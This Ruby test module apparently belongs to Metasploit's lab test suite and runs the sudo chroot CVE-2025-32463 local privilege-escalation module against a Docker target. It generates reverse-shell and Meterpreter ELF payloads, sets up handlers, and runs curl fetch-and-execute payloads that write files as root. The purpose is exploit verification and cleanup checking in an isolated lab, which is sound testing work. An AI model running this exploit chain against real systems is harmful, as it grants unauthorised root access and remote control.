# frozen_string_literal: true

require 'English'
require 'shellwords'
require_relative '../rsync_creds/native'

# Genuine native controls and entry sessions precede the original local owner.
module SudoChrootTarget
  include RsyncCredentialTarget

  OWNER = 'exploit/linux/local/sudo_chroot_cve_2025_32463'
  COMMAND_PAYLOAD = 'cmd/linux/http/x64/exec'

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'sudo-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['linux']
  end

  def sc_native(action, *arguments)
    script = action == 'control' ? 'native_control.py' : 'native_state.py'
    args = action == 'control' ? [@rc.fetch(:settings).fetch('sudo_version')] : [action, *arguments]
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', '0:0', 'linux', 'python3', '-B', '/opt/module-target-sudo/' + script, *args]
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { action: action, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    JSON.parse(output)
  end

  def sc_state
    value = sc_native('state')
    value.fetch('processes').each { |row| row.delete('state') }
    # Raw journals retain these kernel-only records. Live/half-closed sockets
    # and every unexpected nonzero inode remain part of the leak criterion.
    value.fetch('connections').reject! { |row| row.values_at('state', 'inode') == ['06', '0'] }
    value
  end

  def sc_idle
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    expect(sc_state).to eq(@rc.fetch(:baseline))
    rc_resources('idle')
  end

  def sc_ready
    @rc.delete(:prepared)
    family = File.basename(target_runtime.fetch('artifacts'))
    @rc[:settings] = JSON.parse(File.read("test/module_targets/#{family}/settings.json"))
    @rc[:readiness] = sc_native('control')
    expect(@rc.fetch(:readiness)).to include('passed' => true, 'module_invoked' => false, 'original_state_preserved' => true, 'owned_stage_absent' => true)
    @rc[:session_observer] = rc_json("begin;load 'test/module_targets/druid_sessions/session_control.rb';ready=DruidSessionControl.install(framework);load 'test/module_targets/laravel/session_control.rb';ready;end")
    @rc[:owner_observer] = rc_json("begin;load 'test/module_targets/sudo_chroot/observe.rb';SudoChrootObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @rc[:callback] = rc_callback
    @rc[:baseline] = sc_state
    expect(@rc.fetch(:baseline).values_at('tmp', 'connections')).to eq([{}, []])
    sc_idle
    @rc[:prepared] = true
  ensure
    rc_save
  end

  def sc_entry(kind)
    payload = kind == 'shell' ? 'linux/x64/shell_reverse_tcp' : 'linux/x64/meterpreter_reverse_tcp'
    callback = @rc.fetch(:callback)
    listener = TCPServer.new(callback.fetch(:bind), 0)
    port = listener.local_address.ip_port
    listener.close
    @sc_case[:callback_port] = port
    console_command('back')
    console_command('use payload/' + payload)
    { 'LHOST' => callback.fetch(:host), 'LPORT' => port }.each { |name, value| console_command("set #{name} #{value}") }
    console_command('set MeterpreterTryToFork false') if kind == 'meterpreter'
    source = File.join(target_runtime.fetch('artifacts'), kind + '-entry.elf')
    generated = console_command('generate -f elf -o ' + source)
    expect(generated).not_to match(/\[-\]|Error|Exception/)
    expect(File.binread(source)).to start_with("\x7fELF")
    remote = '/tmp/module-target-sudo-entry-' + kind + '.elf'
    # Docker archive copy rejects read-only rootfs even for this writable tmpfs.
    # Stream through an actual UID1001 process and retain the read-only setting.
    argv = target_runtime.fetch('compose') + ['exec', '-T', 'linux', 'sh', '-c', 'cat > "$1"', 'entry-source', remote]
    copied, error, status = Open3.capture3(*argv, stdin_data: File.binread(source))
    @rc[:commands] << { label: 'copy-entry', argv: argv, exit: status.exitstatus, stdout: copied, stderr: error }
    expect(status.success?).to be(true), copied + error
    console_command('back')
    console_command('use exploit/multi/handler')
    {
      'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port,
      'ReverseListenerBindAddress' => callback.fetch(:bind), 'ExitOnSession' => false
    }.each { |name, value| console_command("set #{name} #{value}") }
    console_command('set MeterpreterTryToFork false') if kind == 'meterpreter'
    @sc_case[:handler] = console_command('run -j -z')
    @sc_case[:launch] = sc_native('launch', remote)
    expect(@sc_case.fetch(:launch).fetch('sha256')).to eq(Digest::SHA256.file(source).hexdigest)
    @sc_case[:session] = rc_poll(30) do
      ready = File.readlines(@rc.fetch(:session_observer).fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
      rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,platform:session.platform,owner:session.via_exploit}}').find do |row|
        ready.include?(row.fetch('id')) && row.values_at('type', 'owner') == [kind, 'exploit/multi/handler']
      end
    end
    identifier = @sc_case.fetch(:session).fetch('id')
    @sc_case[:entry_proof_path] = "/tmp/module-target-sudo-session-#{Process.pid}-#{identifier}"
    @sc_case[:entry_proof] = rc_json("LaravelSessionControl.proof(framework,#{identifier},#{@sc_case.fetch(:entry_proof_path).inspect},'sudo-entry',false,component:'sudo')")
    physical = sc_native('file', @sc_case.fetch(:entry_proof_path))
    @sc_case[:physical_entry_proof] = physical
    expect(physical).to include('exists' => true, 'uid' => 1001, 'base64' => Base64.strict_encode64('sudo-entry'))
    @sc_case[:entry_identity] = sc_state.fetch('processes').find { |row| row.fetch('pid') == @sc_case.fetch(:entry_proof).fetch('pid') }
    expect(@sc_case.fetch(:entry_identity)).to include('uid' => 1001)
    console_command('jobs -K')
    @sc_case[:original_cwd] = rc_json("SudoChrootObservation.cwd(framework,#{identifier})")
    expect(@sc_case.fetch(:original_cwd)).to eq('/home/lab')
    @sc_case[:baseline] = sc_state
    @sc_case[:entry_ready] = true
    rc_save
  end

  def sc_call(label, options, action, reuse: true)
    unless reuse
      console_command('back')
      expect(console_command('use ' + OWNER)).not_to match(/Failed to load|Unknown command|No results/)
    end
    options = options.dup
    if options.key?('CMD')
      expect(console_command('set PAYLOAD ' + COMMAND_PAYLOAD)).not_to include('Failed')
      expect(rc_json("active_module.compatible_payloads.any?{|name,_klass|name==#{COMMAND_PAYLOAD.inspect}}")).to be(true)
      rc_json("begin;active_module.datastore['CMD']=#{options.delete('CMD').inspect};true;end")
    end
    identifier = @sc_case.fetch(:session).fetch('id')
    offset = rc_json('framework.instance_variable_get(:@sudo_events).length')
    options = { 'SESSION' => identifier, 'VERBOSE' => true }.merge(options)
    call = { label: label, options: options, action: action }
    @sc_case[:calls] << call
    call[:output] = console_command(action + ' ' + format_datastore_options(options), timeout: 90)
    call[:events] = rc_json("framework.instance_variable_get(:@sudo_events).drop(#{offset})")
    call[:selection] = rc_json('{object:active_module.object_id,payload:active_module.datastore["PAYLOAD"]}')
    call[:cwd] = rc_json("SudoChrootObservation.cwd(framework,#{identifier})")
    call[:state] = sc_state
    rc_save
    call
  end

  def sc_fetch_options(label)
    callback = @rc.fetch(:callback)
    server = TCPServer.new(callback.fetch(:bind), 0)
    port = server.local_address.ip_port
    server.close
    {
      'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => port,
      'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_COMMAND' => 'CURL',
      'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => "module-target-sudo-fetch-#{Process.pid}-#{label}"
    }
  end

  def sc_fetch_file(options, expected_uid)
    path = '/tmp/' + options.fetch('FETCH_FILENAME')
    value = rc_poll(5) do
      observed = sc_native('file', path)
      observed if observed['exists']
    end
    expect(value.fetch('uid')).to eq(expected_uid)
    expect(Base64.strict_decode64(value.fetch('base64'))).to start_with("\x7fELF")
    sc_native('remove', path)
    value
  end

  def sc_fetch_control(command, path, marker, label)
    options = sc_fetch_options('native-' + label)
    expect(sc_native('file', path)).to eq('exists' => false)
    expect(sc_native('file', '/tmp/' + options.fetch('FETCH_FILENAME'))).to eq('exists' => false)
    control = { options: options }
    @sc_case[:fetch_controls] ||= []
    @sc_case[:fetch_controls] << control
    settings = options.merge('CMD' => command)
    # A finite exec payload has no session handler to keep a background job
    # alive. Use the actual producer's public fetch setup/cleanup lifecycle.
    control[:generated] = rc_json("begin;producer=framework.payloads.create(#{COMMAND_PAYLOAD.inspect});framework.instance_variable_set(:@sudo_native_fetch,producer);producer.datastore.merge!(#{settings.inspect});encoded=producer.generate_complete;producer.setup_handler;{payload:producer.refname,command:Base64.strict_encode64(encoded),delete:producer.datastore['FETCH_DELETE']};end")
    expect(control.fetch(:generated)).to include('payload' => COMMAND_PAYLOAD, 'delete' => false)
    control[:execution] = sc_native('command-control', control.fetch(:generated).fetch('command'))
    expect(control.fetch(:execution).fetch('exit')).to eq(0)
    control[:proof] = sc_native('file', path)
    expect(control.fetch(:proof)).to include('exists' => true, 'uid' => 1001, 'base64' => Base64.strict_encode64((marker + "1001\n").b))
    control[:fetched_binary] = sc_fetch_file(options, 1001)
    sc_native('remove', path)
    # Default FETCH_DELETE=false intentionally retains the fetched executable.
    # Its captured lab reset is separate from the module's wrapper/NSS cleanup.
    control[:fixture_fetch_cleanup] = true
    rc_save
  ensure
    rc_json('begin;producer=framework.instance_variable_get(:@sudo_native_fetch);producer.cleanup_handler if producer;framework.instance_variable_set(:@sudo_native_fetch,nil);true;end')
  end

  def sc_case(kind)
    @sc_case = { kind: kind, calls: [] }
    @rc[:cases] << @sc_case
    sc_idle
    sc_entry(kind)
    commands = 2.times.map do |index|
      path = "/tmp/module-target-sudo-owner-#{Process.pid}-#{kind}-#{index}"
      marker = "sudo '雪' \\ line\r\n#{index}:"
      command = 'printf %s ' + Shellwords.escape(marker) + ' > ' + path + '; id -u >> ' + path
      sc_fetch_control(command, path, marker, kind + '-' + index.to_s)
      { index: index, path: path, marker: marker, command: command }
    end
    expected_code = @rc.fetch(:settings).fetch('vulnerable') ? 'appears' : 'safe'
    checks = 2.times.map do |index|
      call = sc_call('check-' + index.to_s, {}, 'check', reuse: index.positive?)
      codes = call.fetch(:events).filter_map { |event| event['check'] }
      expect(codes.length).to eq(1)
      expect(codes.first).to include('code' => expected_code, 'reason' => be_a(String))
      expect(codes.first.fetch('reason')).not_to be_empty
      call
    end
    expect(checks.map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
    aggregate_failures('Original commands, state recovery and repetition') do
      commands.each do |entry|
        index, path, marker, command = entry.values_at(:index, :path, :marker, :command)
        owner_fetch = sc_fetch_options('owner-' + kind + '-' + index.to_s)
        expect(sc_native('file', '/tmp/' + owner_fetch.fetch('FETCH_FILENAME'))).to eq('exists' => false)
        call = sc_call('owner-command-' + index.to_s,
                       owner_fetch.merge('CMD' => command, 'AutoCheck' => true, 'AllowNoCleanup' => true, 'DisablePayloadHandler' => false, 'WfsDelay' => 0), 'run -z')
        call[:physical_proof] = sc_native('file', path)
        rc_save
        bodies = call.fetch(:events).select { |event| event.values_at('event', 'method') == %w[call exploit] && event.fetch('source').end_with?('/sudo_chroot_cve_2025_32463.rb') }
        if @rc.fetch(:settings).fetch('vulnerable')
          expect(bodies.length).to eq(1)
          expect(call.fetch(:physical_proof)).to include('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64((marker + "0\n").b))
          expect(call.fetch(:output)).not_to match(/Exploit failed|Exploit aborted|Exception|undefined method/)
          call[:fetched_binary] = sc_fetch_file(owner_fetch, 0) if call.fetch(:physical_proof)['exists']
          call[:fixture_fetch_cleanup] = true if call[:fetched_binary]
        else
          expect(bodies).to eq([])
          expect(call.fetch(:physical_proof)).to eq('exists' => false)
          expect(call.fetch(:output)).to include('not-vulnerable')
        end
        sc_native('remove', path)
        call[:after_proof_removal] = sc_state
        rc_save
        expect(call.fetch(:cwd)).to eq(@sc_case.fetch(:original_cwd))
        expect(call.fetch(:after_proof_removal).fetch('files')).to eq(@sc_case.fetch(:baseline).fetch('files'))
        expect(call.fetch(:after_proof_removal).fetch('tmp')).to eq(@sc_case.fetch(:baseline).fetch('tmp'))
        expect(call.fetch(:after_proof_removal).fetch('processes')).to include(@sc_case.fetch(:entry_identity))
      end
      expect(@sc_case.fetch(:calls).map { |call| call.fetch(:selection).fetch('object') }.uniq.length).to eq(1)
    end
  ensure
    primary = $ERROR_INFO
    @sc_case[:failure] = { type: primary.class.name, message: primary.message } if primary && @sc_case
    rc_save
    begin
      sc_close_case
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @sc_case[:cleanup_error] = { type: e.class.name, message: e.message } if @sc_case
      rc_save
      raise unless primary
    end
  end

  def sc_close_case
    return unless @sc_case

    identifier = @sc_case.dig(:session, 'id')
    if identifier
      @sc_case[:fixture_cwd_restore] = rc_json("SudoChrootObservation.restore_cwd(framework,#{identifier})")
      @sc_case[:shutdown] = rc_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'sudo')")
      rc_json("framework.sessions[#{identifier}]&.kill;true")
      rc_poll(15) { sc_state.fetch('processes').none? { |row| row.fetch('pid') == @sc_case.fetch(:entry_proof).fetch('pid') } }
      @sc_case[:entry_used_and_closed] = true if @sc_case[:entry_ready]
    end
    console_command('jobs -K')
    @sc_case[:before_fixture_reset] = sc_state
    expect(@sc_case.fetch(:before_fixture_reset).fetch('files')).to eq(@rc.fetch(:baseline).fetch('files'))
    sc_native('reset-created', Base64.strict_encode64(JSON.generate(@sc_case.fetch(:before_fixture_reset).fetch('tmp'))))
    rc_poll(15) { sc_state == @rc.fetch(:baseline) }
    rc_save
    @sc_case = nil
  ensure
    rc_save
  end

  def sc_cleanup
    sc_close_case if @sc_case
    return unless @rc&.[](:prepared)

    sc_idle
    rc_save
  end
end
